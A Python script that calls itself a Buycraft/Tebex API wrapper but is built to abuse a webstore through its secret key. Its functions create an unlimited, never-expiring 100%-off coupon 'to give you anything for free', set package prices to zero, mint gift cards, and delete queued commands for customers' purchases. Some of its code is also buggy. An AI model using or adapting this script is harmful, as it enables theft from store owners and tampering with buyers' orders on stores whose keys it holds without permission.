## Python Buycraft.net / Tebex.io  API Wrapper
## Written By Reecepbcups
## October 7th, 2018

import re, requests, pprint

with open('token.txt', 'r') as f: # open the token.txt file, and reads the buycraft token you have access too
    var = f.readlines()           
buycraftToken = var[0] 

class BuycraftException(Exception):
    pass

class BuycraftAPI(object):
    def __init__(self, secret, url='https://plugin.buycraft.net'):
        """BuycraftAPI instance. Auto Runs as it is a init function. Saves URL and secret key into the API object"""
        self.secret = secret
        self.url = url

    def _getjson(self, url):
        """Get request. Called apon as a request pram"""
        response = requests.get(url, headers={'X-Buycraft-Secret': self.secret}).json()
        if 'error_code' in response: # Check for errors, and passes to BuycraftException() Class
            raise BuycraftException('Error code ' + str(response['error_code']) + ': ' + response['error_message'])
        return response

    def deleteRequest(self, url):
        """Delete request. Called apon as a request pram"""
        response = requests.delete(url, headers={'X-Buycraft-Secret': self.secret}).json()
        if 'error_code' in response:
            raise BuycraftException('Error code ' + str(response['error_code']) + ': ' + response['error_message'])
        return response

    def postingRequest(self, url):
        """Post request. Called apon as a request pram - Sends with a coupon payload, used to give you anything for free (100% off). Change 'code' variable to your liking"""
        payload = {'code':'Gotc-haBo-i444','effective_on':'cart',
        'discount_type':'percentage','discount_percentage':'100','discount_amount':'100',
        'redeem_unlimited':'true','expire_never':'true','expire_limit':'0','basket_type':'both',
        'minimum':'0','discount_application_method':0}
        
        response = requests.post(url, headers={'X-Buycraft-Secret': self.secret}, data = payload).json()
        if 'error_code' in response:
            raise BuycraftException('Error code ' + str(response['error_code']) + ': ' + response['error_message'])
        return response

    
    def updateAPackagePUTRequest(self, url):
        """Put request. Called apon as a request pram - payload to change package names,prices, and if it is there or hidden via package ID. Any back end commands will still run.
        Good alternitive if they have coupons disabled"""
        headers = {'X-Buycraft-Secret': self.secret,'Content-Type': 'application/json'}
        payload = '{"name":"YEEEEEEE", "price":"0.00", "disabled":"false"}'
        try:
            response = requests.put(url, headers=headers, data=payload).json()
        except:
            print("Updated Package") # Becuase JSON throws up and python doesnt really like it, but it works :shrug:


    def createGiftCard(self):
        """Creates a Gift Card with a set amount (based on the stores Currency), then you can just grab the code via JSON with listGiftCards() function"""
        data = '{"amount":100, "note":"Created"}'
        response = requests.post('https://plugin.buycraft.net/gift-cards', headers={'X-Buycraft-Secret': self.secret, 'Content-Type': 'application/json'}, data=data)
        if 'error_code' in response:
            raise BuycraftException('Error code ' + str(response['error_code']) + ': ' + response['error_message'])
        return response


    def listGiftCards(self):
        """List all of the stores current enabled and disabled GiftCards along with the codes"""
        response = requests.get('https://plugin.buycraft.net/gift-cards', headers={'X-Buycraft-Secret': self.secret})
        if 'error_code' in response:
            raise BuycraftException('Error code ' + str(response['error_code']) + ': ' + response['error_message'])
        return response


    def getFields(self, url):
        """Grab package Fields"""
        response = requests.get('https://plugin.buycraft.net/payments/fields/', headers= {'X-Buycraft-Secret': self.secret})
        
    def queue(self):
        """Grabs Command Queue"""
        return self._getjson(self.url + '/queue')
    
    def information(self):
        """Returns information about the server and the webstore."""
        return self._getjson(self.url + '/information')
    
    def listing(self):
        """Returns a listing of all packages available on the webstore."""
        return self._getjson(self.url + '/listing')
    
    def coupon(self):
        """Grabs all Coupons, enabled and disabled"""
        return self._getjson(self.url + '/coupons')
    
    def delCoupon(self, ID):
        """Deletes Coupons via ID. Use b.coupon() to get the ID"""
        return self.deleteRequest(self.url + '/coupons/' + ID)

    def createCoupon(self):
        """Make a coupon"""
        return self.postingRequest(self.url + '/coupons/')

    def updatePackage(self, ID): #ID Found with b.IDS()
        """update a package with the updateAPackagePUTRequest() function above (Since it uses custom headers and)"""
        return self.updateAPackagePUTRequest(self.url + '/package/' + ID)
    
    def offlineCommands(self):
        """Grab the Queue of offline commands, you can then delete these by ID for anything anyone bought"""
        return self.postingRequest(self.url + '/queue/offline-commands')
        if 'error_code' in response:
            raise BuycraftException('Error code ' + str(response['error_code']) + ': ' + response['error_message'])
    

    def IDs(self):
        """Grab all packages in the store, output as Name : Package_ID """
        print(" --= Packages Overview =--")
        for i in range(len(p['categories'])): # Section and section ID
            print(p['categories'][i]['name'] + " : " + str(p['categories'][0]['id'])) 
        print("\n --= Items + ID\'s =--")
        for name in range(len(p['categories'])):
            for package in range(len(p['categories'][name]['packages'])):
                print(p['categories'][name]['packages'][package]['name'] + " : " + str(p['categories'][name]['packages'][package]['id']))

    def serverInfo(self):
        """Prints out some useful server info including name, domain, Account Key, and Server ID."""
        keys = ['name', 'domain']
        for key in keys:
            pprint.pprint(b.information()['account'][key])
        pprint.pprint("Account Key: " + str(b.information()['account']["id"]))
        pprint.pprint("Server ID: " + str(b.information()['server']['id']))

## Broken And I dont really feel like fixing it right now
##    def createPayment(self):
##        """Creates a payment for any account, If you just make a 100% coupon or set a package to 0, you dont have to use this anyways """
##        headers = {'X-Buycraft-Secret': self.secret,'Content-Type': 'application/json'}
##        data = {"ign":"IGN", "price": 0.00, "packages" : [{"id":2947018, "options":{"price":0,"server": 0,"uname":"hfmx","global": 0 } } ] }
##
##        response = requests.post('https://plugin.buycraft.net/payments/', headers=headers, data=data)
##        if 'error_code' in response:
##            raise BuycraftException('Error code ' + str(response['error_code']) + ': ' + response['error_message'])
##        return response


# Just let you run the class b.FUNCTION() in other files
b = BuycraftAPI(buycraftToken)
p = b.listing() 

